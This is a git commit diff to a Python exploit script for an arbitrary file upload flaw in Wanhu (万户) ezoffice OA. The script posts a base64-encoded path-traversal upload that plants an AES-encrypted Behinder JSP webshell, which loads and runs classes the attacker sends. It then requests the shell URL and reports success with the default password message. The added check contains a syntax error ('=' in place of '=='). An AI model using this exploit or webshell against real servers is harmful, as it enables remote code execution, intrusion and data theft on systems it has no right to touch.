15244279c340ae9cd421af9891112bede087dfc5
LittleBear <113894585+LittleBear4@users.noreply.github.com>
2023-04-23 12:32:18 +0800

    Add files via upload

--- main/ezoffice/万户OA_office_任意文件上传.py
+++ main/ezoffice/万户OA_office_任意文件上传.py
@@ -13,6 +13,9 @@ def main(target_url):
         target_url = 'http://' + target_url
     if target_url[-1]!='/':
         target_url += '/' 
+    headerx = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
+    }    
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0", 
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
@@ -26,14 +29,19 @@ isDoc=dHJ1ZQ==
 moduleType=Z292ZG9jdW1lbnQ=
 FILETYPE=Li4vLi4vcHVibGljL2VkaXQvY21kX3Rlc3QuanNw
 111111111111111111111111111111111111111111111111
-<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>'''
+<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>hello'''
     console.print(now_time() + " [INFO]     正在检测万户OA OfficeServer.jsp 任意文件上传漏洞", style='bold blue')
+    shell_url=target_url+'defaultroot/public/edit/cmd_test.jsp'
     try:
         requests.packages.urllib3.disable_warnings()
         upload = requests.post(exp_url, headers=headers, data=data, verify=False)
+        shell=requests.get(shell_url,headers=headerx,verify=False)
         if upload.status_code == 200:
-            shell_url=target_url+'defaultroot/public/edit/cmd_test.jsp'
-            console.print(now_time() + ' [SUCCESS]  上传webshell成功，默认冰蝎密码:{}'.format(shell_url), style='bold green')
+            if shell.status_code=200:
+            
+                console.print(now_time() + ' [SUCCESS]  上传webshell成功，默认冰蝎密码:{}'.format(shell_url), style='bold green')
+            else:
+                console.print(now_time() + ' [WARNING]  万户OA OfficeServer.jsp 任意文件上传漏洞不存在', style='bold red ')
         else:
             console.print(now_time() + ' [WARNING]  万户OA OfficeServer.jsp 任意文件上传漏洞不存在', style='bold red ')
     except:
